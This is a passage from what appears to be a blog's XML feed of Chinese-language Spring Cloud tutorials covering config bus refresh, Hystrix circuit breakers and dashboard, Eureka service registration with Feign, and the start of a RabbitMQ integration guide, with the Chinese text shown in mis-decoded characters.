,ÊòØtopicÁ±ªÂûã,‰∏â‰∏™ÁªëÂÆöËØ•exchangeÁöÑqueueÁöÑrouting keyÈÉΩÊòØ#Ôºå‰πüÂ∞±ÊòØ‰∏çÂ§ÑÁêÜfanout</p><p><strong>ÊµãËØï</strong></p><pre><code>È¶ñÂÖà‰øÆÊîπconfig-repo,Âπ∂Êèê‰∫§È¶ñÂÖàÊü•ÁúãÊï∞ÊçÆD:\gitclonepackage\cloud&gt;curl localhost:13000/hellohuskyui-update-2020-03-30D:\gitclonepackage\cloud&gt;curl localhost:13001/hellohuskyui-update-2020-03-30Ë∞ÉÁî®Âà∑Êñ∞Êìç‰Ωúcurl -X POST localhost:12000/actuator/bus-refreshËøô‰∏™ËØ∑Ê±ÇÁöÑÊó∂ÂÄôÔºåÊòØËØ∑Ê±Çconfig-server;ÂΩìÁÑ∂‰πüÂèØ‰ª•ËØ∑Ê±Çconfig-clientÁöÑbus-refreshD:\gitclonepackage\cloud&gt;curl localhost:13001/hellohuskyui-update-2020-03-30-last-commitD:\gitclonepackage\cloud&gt;curl localhost:13000/hellohuskyui-update-2020-03-30-last-commit</code></pre><p>Êú¨ÁØáÊñáÁ´†ÂèÇËÄÉÔºö</p><p>[ Spring CloudÔºà‰∏ÉÔºâÔºöÈÖçÁΩÆ‰∏≠ÂøÉÔºàGit Áâà‰∏éÂä®ÊÄÅÂà∑Êñ∞Ôºâ ](<a href="https://windmt.com/2018/04/19/spring-" target="_blank" rel="noopener">https://windmt.com/2018/04/19/spring-</a><br>cloud-7-config-sample/)<br>[ Spring CloudÔºàÂÖ´ÔºâÔºöÈÖçÁΩÆ‰∏≠ÂøÉÔºàÊúçÂä°Âåñ‰∏éÈ´òÂèØÁî®Ôºâ ](<a href="https://windmt.com/2018/04/19/spring-" target="_blank" rel="noopener">https://windmt.com/2018/04/19/spring-</a><br>cloud-8-config-with-eureka/)</p><p><a href="https://windmt.com/2018/04/19/spring-cloud-9-config-eureka-bus/" target="_blank" rel="noopener"> Spring CloudÔºà‰πùÔºâÔºöÈÖçÁΩÆ‰∏≠ÂøÉÔºàÊ∂àÊÅØÊÄªÁ∫øÔºâ„ÄêFinchley Áâà„Äë</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
            <tag> spring cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringCloud-Hystrix</title>
      <link href="/2020/03/24/SpringCloud-Hystrix/"/>
      <url>/2020/03/24/SpringCloud-Hystrix/</url>
      
        <content type="html"><![CDATA[<h3 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h3><p>Hystrix is a latency and fault tolerance library designed to isolate points of<br>access to remote systems, services and 3rd party libraries, stop cascading<br>failure and enable resilience in complex distributed systems where failure is<br>inevitable.</p><p>HystrixÊòØ‰∏Ä‰∏™Âª∂ËøüÂíåÂÆπÈîôÂ∫ìÔºåÊó®Âú®ÈöîÁ¶ªËøúÁ®ãÁ≥ªÁªü„ÄÅÊúçÂä°ÂíåÁ¨¨‰∏âÊñπÂ∫ìÁöÑËÆøÈóÆÁÇπÔºåÂÅúÊ≠¢Ê¨°Á∫ßÊïÖÈöúÔºåÂπ∂‰∏î‰∏çÂèØÈÅøÂÖçÁöÑÂ§çÊùÇÂàÜÂ∏ÉÂºèÁ≥ªÁªü‰∏≠ÂÆûÁé∞Ëá™ÊàëÊÅ¢Â§çËÉΩÂäõ„ÄÇ</p><h4 id="ÈÖçÁΩÆhystrix"><a href="#ÈÖçÁΩÆhystrix" class="headerlink" title="ÈÖçÁΩÆhystrix"></a>ÈÖçÁΩÆhystrix</h4><p><strong>pom</strong></p><pre><code>  &lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.67&lt;/version&gt;  &lt;/dependency&gt;&lt;!--web--&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;  &lt;/dependency&gt; &lt;!--Eureka client --&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;  &lt;/dependency&gt; &lt;!-- Hystrix --&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;  &lt;/dependency&gt; &lt;!-- Â£∞ÊòéÊÄßRESTÂÆ¢Êà∑Á´ØÔºå‰ΩøÁî®Ê≥®Ëß£‰øÆÈ•∞Êé•Âè£ÔºåÂä®ÊÄÅÂÆûÁé∞ --&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;  &lt;/dependency&gt; &lt;!--‰∏∫‰∫ÜÂêéÁª≠ÊîæÂºÄhystrix.streamË∑ØÂæÑ--&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><p><strong>application.yml</strong></p><pre><code>spring:  application:    name: eureka-consumer-feign-hystrix# ÂΩìÂâçÂ∫îÁî®ÂêçÁß∞eureka:  client:    service-url:      defaultZone: http://localhost:7000/eureka/ # Êò†Â∞ÑÂà∞Eureka serverÁöÑË∑ØÂæÑserver:  port: 9001feign:  hystrix:    enabled: true# an OpenFeign client will be wrapped with a Hystrix circuit breaker# ‰∏Ä‰∏™OpenFeignÂÆ¢Êà∑Á´ØÂ∞ÜÂåÖË£ÖÊúâHystrixÊñ≠Ë∑ØÂô®management:  endpoints:    web:      exposure:        include: hystrix.stream# ‰∏∫‰∫ÜÁªôHystrix DashboardÊèê‰æõ‰ΩøÁî®</code></pre><p><strong>ÂêØÂä®Á±ªÈÖçÁΩÆ</strong></p><pre><code>@EnableFeignClients//Êâ´ÊèèÂåÖ‰∏ãË¢´@FeignClientÊ≥®Ëß£ÁöÑÔºåÈúÄË¶ÅÂíå@ConfigurationÂêåÊó∂‰ΩøÁî®@EnableHystrix//ÂºÄÂêØÊñ≠Ë∑ØÂô®ÔºåÂπ∂‰∏îËá™Âä®ÈÖçÁΩÆÊâæÂà∞HystrixÁ±ªÔºàif they are availableÔºâ@SpringBootApplicationpublic class CloudConsumerFeignHystrixApplication {    public static void main(String[] args) {        SpringApplication.run(CloudConsumerFeignHystrixApplication.class, args);    }}</code></pre><p><strong>ËøúÁ®ãË∞ÉÁî®</strong></p><pre><code>@Component// nameÔºö the service id with optional protocol prefix.Â∏¶ÊúâÂèØÈÄâÂçèËÆÆÂâçÁºÄÁöÑÊúçÂä°ID// fallbackÔºö ÊåáÂÆöÁöÑFeignÂÆ¢Êà∑Á´ØÊé•Âè£ÁöÑÂêéÂ§áÁ±ª„ÄÇfallbackÁ±ªÂøÖÈ°ªÂÆûÁé∞ËØ•Êé•Âè£Âπ∂‰∏îÊòØ‰∏Ä‰∏™ÊúâÊïàÁöÑspring bean//Fallback class for the specified Feign client interface. The fallback class must// implement the interface annotated by this annotation and be a valid spring bean.@FeignClient(name = &quot;eureka-producer&quot;,fallback = HelloRemoteHystrix.class)public interface HelloRemote {    @RequestMapping(&quot;/hello&quot;)    String hello(@RequestBody JSONObject requestJSON);}</code></pre><p><strong>fallbackÁ±ª</strong></p><pre><code>@Componentpublic class HelloRemoteHystrix implements HelloRemote {    @Override    public String hello(JSONObject requestJSON) {        return &quot;hello world&quot;;    }}</code></pre><p><strong>controller</strong></p><pre><code>@RestControllerpublic class HelloController {    @Resource    private HelloRemote helloRemote;    @RequestMapping(&quot;/hello/{name}&quot;)    public String hello(@PathVariable(name = &quot;name&quot;)String name){        JSONObject requestJSON = new JSONObject();        requestJSON.put(&quot;name&quot;,name);        return helloRemote.hello(requestJSON);    }}</code></pre><p><strong>ÊµãËØï</strong></p><pre><code>Â∞Üeureka-serverÔºåproducerÔºåfeign-hystrix‰∏â‰∏™È°πÁõÆÂêØÂä®ÔºåÂú®eureka-server‰∏äÂèØ‰ª•ÁúãÂà∞producerÂíåfeign-hystrixÈÉΩÂ∑≤ÁªèÊ≥®ÂÜåÊàêÂäü„ÄÇËÆøÈóÆÔºölocalhost:9001/hello/huskyuihello, huskyui Tue Mar 24 14:34:44 CST 2020Â∞ÜproducerÂÖ≥Èó≠ËÆøÈóÆÔºölocalhost:9001/hello/huskyuihello worldÂÜçÊ¨°Â∞ÜproducerÂêØÂä®hello, huskyui Tue Mar 24 14:40:27 CST 2020ËøôËæπÔºåÂèØ‰ª•ÁúãÂà∞ÁÜîÊñ≠ËÉΩÂäõÔºå‰ª•ÂèäËá™ÊàëÊÅ¢Â§çËÉΩÂäõ</code></pre><h4 id="ÈÖçÁΩÆ‰∏Ä‰∏™Hystrix-dashboard"><a href="#ÈÖçÁΩÆ‰∏Ä‰∏™Hystrix-dashboard" class="headerlink" title="ÈÖçÁΩÆ‰∏Ä‰∏™Hystrix dashboard"></a>ÈÖçÁΩÆ‰∏Ä‰∏™Hystrix dashboard</h4><p><strong>pom</strong></p><pre><code>&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><p><strong>application.yml</strong></p><pre><code>spring:  application:    name: hystrix-dashboardserver:  port: 11000</code></pre><p><strong>Ê∑ªÂä†Ê≥®Ëß£@EnableHystrixDashboard</strong></p><pre><code>@SpringBootApplication@EnableHystrixDashboardpublic class CloudHystrixDashboardApplication {    public static void main(String[] args) {        SpringApplication.run(CloudHystrixDashboardApplication.class, args);    }}</code></pre><p><strong>ÊµãËØï</strong></p><pre><code>ËøêË°åËØ•È°πÁõÆËÆøÈóÆÔºö http://localhost:11000/hystrixÂú®ÂêØÂä®ÂêéËæìÂÖ•http://localhost:9001/actuator/hystrix.stream9001ÊòØfeign-hystrixÁöÑÈ°πÁõÆÁöÑÁ´ØÂè£ÔºåÂΩìÊó∂Êàë‰ª¨ÂºïÂÖ•‰∫ÜactuatorÔºåÂºÄÊîæhystrix.streamÂèØ‰ª•ÁúãÂà∞dashboardÁõ∏ÂÖ≥</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringCloud-Eureka</title>
      <link href="/2020/03/20/SpringCloud-Eureka/"/>
      <url>/2020/03/20/SpringCloud-Eureka/</url>
      
        <content type="html"><![CDATA[<h2 id="categories-springcloud"><a href="#categories-springcloud" class="headerlink" title="categories: springcloud"></a>categories: springcloud</h2><h3 id="EurekaÁÆÄ‰ªã"><a href="#EurekaÁÆÄ‰ªã" class="headerlink" title="EurekaÁÆÄ‰ªã"></a>EurekaÁÆÄ‰ªã</h3><p>EurekaÊòØ‰∏ÄÁßçÂü∫‰∫éREST(Representational State<br>ThransferË°®Áé∞Â±ÇÁä∂ÊÄÅËΩ¨Áßª)ÁöÑÊúçÂä°Ôºå‰∏ªË¶ÅÁî®‰∫éAWSÁöÑÂÆö‰ΩçÊúçÂä°Ôºå‰ª•‰æøÂÆûÁé∞‰∏≠Èó¥Â±ÇÊúçÂä°Âô®ÁöÑË¥üËΩΩÂùáË°°ÂíåÊïÖÈöúËΩ¨Áßª„ÄÇ</p><h3 id="Âçï‰∏™Ê≥®ÂÜå‰∏≠ÂøÉÊï¥Âêà"><a href="#Âçï‰∏™Ê≥®ÂÜå‰∏≠ÂøÉÊï¥Âêà" class="headerlink" title="Âçï‰∏™Ê≥®ÂÜå‰∏≠ÂøÉÊï¥Âêà"></a>Âçï‰∏™Ê≥®ÂÜå‰∏≠ÂøÉÊï¥Âêà</h3><h4 id="pomÈÖçÁΩÆ"><a href="#pomÈÖçÁΩÆ" class="headerlink" title="pomÈÖçÁΩÆ"></a>pomÈÖçÁΩÆ</h4><pre><code>&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><h4 id="application-yml"><a href="#application-yml" class="headerlink" title="application.yml"></a>application.yml</h4><pre><code>spring:  application:    name: eureka-serverserver:  port: 7000 # Server HTTP port.eureka:  instance:    hostname: localhost # eurekaÂÆû‰æãÁöÑhostname  client:    register-with-eureka: false # ÊåáÁ§∫ÂΩìÂâçÂÆû‰æãÊòØÂê¶Â∫îÂú®eurekaÊúçÂä°Âô®‰∏äÊ≥®ÂÜåÂÖ∂‰ø°ÊÅØ‰ª•‰æõÂèëÁé∞    fetch-registry: false # ÊåáÁ§∫ÂΩìÂâçÂÆû‰æãÊòØÂê¶‰ªéeurekaÊúçÂä°Âô®Ëé∑ÂèñÊ≥®ÂÜåË°®‰ø°ÊÅØ    service-url: # Êò†Â∞Ñmap„ÄÇÊò†Â∞ÑÂÖ≥‰∫éeurekaÊúçÂä°Âô®ÁöÑurlÂàóË°®ÔºåmapÁöÑvalueÂÄºÂèØ‰ª•ÊòØÂçï‰∏™urlÔºå‰πüÂèØ‰ª•ÊòØ‰ª•,ÂàÜÂâ≤Á¨¶ÂàÜÂâ≤ÁöÑÂ§ö‰∏™urlÔºå‰øÆÊîπ‰πãÂêéÁîüÊïàÊó∂Èó¥Â∞ÜÂú®‰∏ã‰∏Ä‰∏™Âæ™ÁéØ‰∏≠ÔºåÁî±eurekaServiceUrlPollIntervalSecondsÊåáÂÆö      defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/</code></pre><h4 id="Ê≥®Ëß£-EnableEurekaServer"><a href="#Ê≥®Ëß£-EnableEurekaServer" class="headerlink" title="Ê≥®Ëß£@EnableEurekaServer"></a>Ê≥®Ëß£@EnableEurekaServer</h4><pre><code>@EnableEurekaServer // Annotation to activate Eureka Server related configuration. ÊøÄÊ¥ªeurekaÁõ∏ÂÖ≥ÈÖçÁΩÆÁöÑÊ≥®Ëß£@SpringBootApplicationpublic class EurekaServerApplication {    public static void main(String[] args) {        SpringApplication.run(EurekaServerApplication.class, args);    }}</code></pre><h4 id="ÊâìÂåÖÈÉ®ÁΩ≤ËøêË°å"><a href="#ÊâìÂåÖÈÉ®ÁΩ≤ËøêË°å" class="headerlink" title="ÊâìÂåÖÈÉ®ÁΩ≤ËøêË°å"></a>ÊâìÂåÖÈÉ®ÁΩ≤ËøêË°å</h4><pre><code>mvn clean package -Dmaven.test.skip=truejava -jar xxx.jarËÆøÈóÆ localhost:7000</code></pre><h3 id="Ê≥®ÂÜå‰∏§‰∏™Ê≥®ÂÜå‰∏≠ÂøÉ"><a href="#Ê≥®ÂÜå‰∏§‰∏™Ê≥®ÂÜå‰∏≠ÂøÉ" class="headerlink" title="Ê≥®ÂÜå‰∏§‰∏™Ê≥®ÂÜå‰∏≠ÂøÉ"></a>Ê≥®ÂÜå‰∏§‰∏™Ê≥®ÂÜå‰∏≠ÂøÉ</h3><h3 id="‰øÆÊîπapplication-yamlÈÖçÁΩÆÊñá‰ª∂"><a href="#‰øÆÊîπapplication-yamlÈÖçÁΩÆÊñá‰ª∂" class="headerlink" title="‰øÆÊîπapplication.yamlÈÖçÁΩÆÊñá‰ª∂"></a>‰øÆÊîπapplication.yamlÈÖçÁΩÆÊñá‰ª∂</h3><pre><code>## Êñ∞Â¢û‰∏§‰∏™ÈÖçÁΩÆÊñá‰ª∂## application-peer1.ymlspring:  application:    name: eureka-serverserver:  port: 7001 # Server HTTP port.eureka:  instance:    hostname: localhost # eurekaÂÆû‰æãÁöÑhostname  client:    register-with-eureka: true # ÊåáÁ§∫ÂΩìÂâçÂÆû‰æãÊòØÂê¶Â∫îÂú®eurekaÊúçÂä°Âô®‰∏äÊ≥®ÂÜåÂÖ∂‰ø°ÊÅØ‰ª•‰æõÂèëÁé∞    fetch-registry: true # ÊåáÁ§∫ÂΩìÂâçÂÆû‰æãÊòØÂê¶‰ªéeurekaÊúçÂä°Âô®Ëé∑ÂèñÊ≥®ÂÜåË°®‰ø°ÊÅØ    service-url: # Êò†Â∞Ñmap„ÄÇÊò†Â∞ÑÂÖ≥‰∫éeurekaÊúçÂä°Âô®ÁöÑurlÂàóË°®ÔºåmapÁöÑvalueÂÄºÂèØ‰ª•ÊòØÂçï‰∏™urlÔºå‰πüÂèØ‰ª•ÊòØ‰ª•,ÂàÜÂâ≤Á¨¶ÂàÜÂâ≤ÁöÑÂ§ö‰∏™urlÔºå‰øÆÊîπ‰πãÂêéÁîüÊïàÊó∂Èó¥Â∞ÜÂú®‰∏ã‰∏Ä‰∏™Âæ™ÁéØ‰∏≠ÔºåÁî±eurekaServiceUrlPollIntervalSecondsÊåáÂÆö      defaultZone: http://127.0.0.1:7002/eureka/ ## application-peer2.yml spring:  application:    name: eureka-serverserver:  port: 7002 # Server HTTP port.eureka:  instance:    hostname: localhost # eurekaÂÆû‰æãÁöÑhostname  client:    register-with-eureka: true # ÊåáÁ§∫ÂΩìÂâçÂÆû‰æãÊòØÂê¶Â∫îÂú®eurekaÊúçÂä°Âô®‰∏äÊ≥®ÂÜåÂÖ∂‰ø°ÊÅØ‰ª•‰æõÂèëÁé∞    fetch-registry: true # ÊåáÁ§∫ÂΩìÂâçÂÆû‰æãÊòØÂê¶‰ªéeurekaÊúçÂä°Âô®Ëé∑ÂèñÊ≥®ÂÜåË°®‰ø°ÊÅØ    service-url: # Êò†Â∞Ñmap„ÄÇÊò†Â∞ÑÂÖ≥‰∫éeurekaÊúçÂä°Âô®ÁöÑurlÂàóË°®ÔºåmapÁöÑvalueÂÄºÂèØ‰ª•ÊòØÂçï‰∏™urlÔºå‰πüÂèØ‰ª•ÊòØ‰ª•,ÂàÜÂâ≤Á¨¶ÂàÜÂâ≤ÁöÑÂ§ö‰∏™urlÔºå‰øÆÊîπ‰πãÂêéÁîüÊïàÊó∂Èó¥Â∞ÜÂú®‰∏ã‰∏Ä‰∏™Âæ™ÁéØ‰∏≠ÔºåÁî±eurekaServiceUrlPollIntervalSecondsÊåáÂÆö      defaultZone: http://127.0.0.1:7001/eureka/</code></pre><h4 id="ÊâìÂåÖÈÉ®ÁΩ≤"><a href="#ÊâìÂåÖÈÉ®ÁΩ≤" class="headerlink" title="ÊâìÂåÖÈÉ®ÁΩ≤"></a>ÊâìÂåÖÈÉ®ÁΩ≤</h4><pre><code>// ÊâìÂåÖmvn clean package -Dmaven.test.skip=true// ËøêË°åjava -jar xxx.jar --spring.profiles.active=peer1java -jar xxx.jpg --spring.profiles.active=peer2// ËÆøÈóÆlocalhost:7001localhost:7002</code></pre><h3 id="ÊúçÂä°Êèê‰æõÂíåË∞ÉÁî®"><a href="#ÊúçÂä°Êèê‰æõÂíåË∞ÉÁî®" class="headerlink" title="ÊúçÂä°Êèê‰æõÂíåË∞ÉÁî®"></a>ÊúçÂä°Êèê‰æõÂíåË∞ÉÁî®</h3><h4 id="ÁîüÊàêËÄÖ"><a href="#ÁîüÊàêËÄÖ" class="headerlink" title="ÁîüÊàêËÄÖ"></a>ÁîüÊàêËÄÖ</h4><h5 id="pom"><a href="#pom" class="headerlink" title="pom"></a>pom</h5><pre><code>&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.67&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><h5 id="application-yml-1"><a href="#application-yml-1" class="headerlink" title="application.yml"></a>application.yml</h5><pre><code>spring:  application:    name: eureka-producereureka:  client:    service-url:      defaultZone: http://127.0.0.1:7000/eureka/server:  port: 8000</code></pre><h5 id="ÂÖ∑‰ΩìÊñπÊ≥ï"><a href="#ÂÖ∑‰ΩìÊñπÊ≥ï" class="headerlink" title="ÂÖ∑‰ΩìÊñπÊ≥ï"></a>ÂÖ∑‰ΩìÊñπÊ≥ï</h5><pre><code>@RestControllerpublic class HelloController {    @RequestMapping(&quot;/hello&quot;)    public String hello(@RequestBody JSONObject requestJSON) {        String name = requestJSON.getString(&quot;name&quot;);        return &quot;hello, &quot; + name + &quot; &quot; + new Date();    }}</code></pre><h5 id="ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï"><a href="#ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï" class="headerlink" title="ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï"></a>ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï</h5><pre><code>mvn clean package -Dmaven.test.skip=truejava -jar xxx.jarcurl -H&apos;Content-Type: application/json&apos; -d&apos;{&quot;name&quot;:&quot;huskyui&quot;}&apos; localhost:8000/hellohello, huskyui Fri Mar 20 16:06:40 CST 2020</code></pre><h4 id="Ê∂àË¥πËÄÖ"><a href="#Ê∂àË¥πËÄÖ" class="headerlink" title="Ê∂àË¥πËÄÖ"></a>Ê∂àË¥πËÄÖ</h4><h5 id="pom-1"><a href="#pom-1" class="headerlink" title="pom"></a>pom</h5><pre><code>&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;       &lt;dependency&gt;           &lt;groupId&gt;com.alibaba&lt;/groupId&gt;           &lt;artifactId&gt;fastjson&lt;/artifactId&gt;           &lt;version&gt;1.2.67&lt;/version&gt;       &lt;/dependency&gt;       &lt;dependency&gt;           &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;           &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;       &lt;/dependency&gt;       &lt;dependency&gt;           &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;           &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;       &lt;/dependency&gt;       &lt;dependency&gt;           &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;           &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;       &lt;/dependency&gt;</code></pre><h5 id="application-yml-2"><a href="#application-yml-2" class="headerlink" title="application.yml"></a>application.yml</h5><pre><code>spring:  application:    name: eureka-consumereureka:  client:    service-url:      defaultZone: http://localhost:7000/eureka/server:  port: 9000</code></pre><h5 id="Ê∑ªÂä†-EnableFeignClients"><a href="#Ê∑ªÂä†-EnableFeignClients" class="headerlink" title="Ê∑ªÂä†@EnableFeignClients"></a>Ê∑ªÂä†@EnableFeignClients</h5><pre><code>@EnableFeignClients@SpringBootApplicationpublic class CloudEurekaConsumerApplication {    public static void main(String[] args) {        SpringApplication.run(CloudEurekaConsumerApplication.class, args);    }}</code></pre><h5 id="ÂÖ∑‰Ωì‰ª£Á†Å"><a href="#ÂÖ∑‰Ωì‰ª£Á†Å" class="headerlink" title="ÂÖ∑‰Ωì‰ª£Á†Å"></a>ÂÖ∑‰Ωì‰ª£Á†Å</h5><pre><code>@FeignClient(name = &quot;eureka-producer&quot;)public interface HelloRemote {    @RequestMapping(&quot;/hello&quot;)    String hello(@RequestBody JSONObject requestJSON);}@RestControllerpublic class HelloController {    @Autowired    private HelloRemote helloRemote;    @RequestMapping(&quot;/hello/{name}&quot;)    public String index(@PathVariable(&quot;name&quot;)String name){        JSONObject requestJSon = new JSONObject();        requestJSon.put(&quot;name&quot;,name);        return helloRemote.hello(requestJSon);    }}</code></pre><h5 id="ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï-1"><a href="#ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï-1" class="headerlink" title="ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï"></a>ÊâìÂåÖÈÉ®ÁΩ≤ÊµãËØï</h5><pre><code>mvn clean package -Dmaven.test.skip=truejava -jar xxx.jarcurl localhost:9000/hello/huskyuihello, huskyui Fri Mar 20 16:11:59 CST 2020</code></pre><h4 id="Ë¥üËΩΩÂùáË°°"><a href="#Ë¥üËΩΩÂùáË°°" class="headerlink" title="Ë¥üËΩΩÂùáË°°"></a>Ë¥üËΩΩÂùáË°°</h4><p>ÂêØÂä®‰∏§‰∏™‰∏çÂêåÁ´ØÂè£ÁöÑÁîü‰∫ßËÄÖÔºåÂêØÂä®‰∏Ä‰∏™Ê∂àË¥πËÄÖ‰ºöÂÆûÁé∞Áõ∏ÂÖ≥ÊïàÊûú</p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
            <tag> spring cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBootÊï¥ÂêàRabbitMQ</title>
      <link href="/2020/03/19/SpringBoot%E6%95%B4%E5%90%88RabbitMQ/"/>
      <url>/2020/03/19/SpringBoot%E6%95%B4%E5%90%88RabbitMQ/</url>
      
        <content type="html"><![CDATA[<h3 id="SpringBootÈÖçÁΩÆRabbitMQ"><a href="#SpringBootÈÖçÁΩÆRabbitMQ" class="headerlink" title="SpringBootÈÖçÁΩÆRabbitMQ"></a>SpringBootÈÖçÁΩÆRabbitMQ</h3><h4 id="ÈÖçÁΩÆmaven"><a href="#ÈÖçÁΩÆmaven" class="headerlink" title="ÈÖçÁΩÆmaven"></a>ÈÖçÁΩÆmaven</h4><pre><code>&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><h4 id="ÈÖçÁΩÆÊñá‰ª∂application-yml"><a href="#ÈÖçÁΩÆÊñá‰ª∂application-yml" class="headerlink" title="ÈÖçÁΩÆÊñá‰ª∂application.yml"></a>ÈÖçÁΩÆÊñá‰ª∂application.yml</h4><pre><code>spring:  rabbitmq:    username: user_mmr #Áî®Êà∑Âêç    password: 123 #ÂØÜÁ†Å    host: localhost # ‰Ω†Ë¶ÅËøûÊé•ÁöÑRabbitMQÁöÑhost    port: 5672 # RabbitÁöÑport    virtual-host: &apos;/vhost_mmr&apos; #virtual-host</code></pre><h3 id="RabbitMQÊïôÁ®ã"><a href="#RabbitMQÊïôÁ®ã" class="headerlink" title="RabbitMQÊïôÁ®ã"></a>RabbitMQÊïôÁ®ã</h3><p>‰ª•‰∏ãÊïôÁ®ãÈÉΩÂèØ‰ª•Âú®RabbitMQÂú®githubÁöÑ‰ªìÂ∫ì <code>rabbitmq-tutorial</code> ‰∏≠ÊâæÂà∞ÔºåÂÖ∑‰ΩìspringbootÂú® <code>spring-amqp</code> Ê®°Âùó‰∏≠„ÄÇÂú®ËøôÈáåÈù¢Ë¶ÅËÆ≤‰∏Ä‰∏ãÂ¶Ç‰ΩïËøêË°åÁõ∏ÂÖ≥‰ª£Á†Å</p><pre><code>### ÊâìÂåÖÈ°πÁõÆmvn clean package### ËøêË°åÈ°πÁõÆjava -jar xxx.jar --spring.profiles.active=tut1,sender### ‰∏ãÈù¢Êîæ‰∏äÁõ∏ÂÖ≥ËøêË°åÂëΩ‰ª§System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=hello-world,receiver&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=hello-world,sender&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=work-queues,receiver&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=work-queues,sender&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=pub-sub,receiver&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=pub-sub,sender&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=routing,receiver&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=routing,sender&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=topics,receiver&quot;);System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=topics,sender&quot;);#### Ê≥®ÊÑèÔºåËØ•È°πÁõÆ‰ΩøÁî®‰∫ÜÂÆöÊó∂‰ªªÂä°‰Ω†ÈúÄË¶ÅÈÖçÁΩÆÂÖÅËÆ∏ÂÆöÊó∂Ë∞ÉÂ∫¶ÁöÑÊ≥®Ëß£@EnableScheduling</code></pre><h4 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h4><pre><code>@Profile({&quot;tut1&quot;,&quot;hello-world&quot;})@Configurationpublic class Tut1Config {    @Bean    public Queue hello(){        return new Queue(&quot;hello&quot;);    }    @Profile(&quot;receiver&quot;)    @Bean    public Tut1Receiver receiver(){        return new Tut1Receiver();    }    @Profile(&quot;sender&quot;)    @Bean    public Tut1Sender sender(){        return new Tut1Sender();    }}// ÁõëÂê¨helloÈòüÂàó Annotation that marks a method to be the target of a Rabbit message listener on the// specified queues()ÊàñËÄÖbindings(). @RabbitListener(queues = &quot;hello&quot;)public class Tut1Receiver {    private static final Logger logger = LoggerFactory.getLogger(Tut1Receiver.class);    // Annotation that marks a method to be the target of a Rabbit message     // listener within a class that is annotated with {@link RabbitListener}    @RabbitHandler    public void receive(String in) {        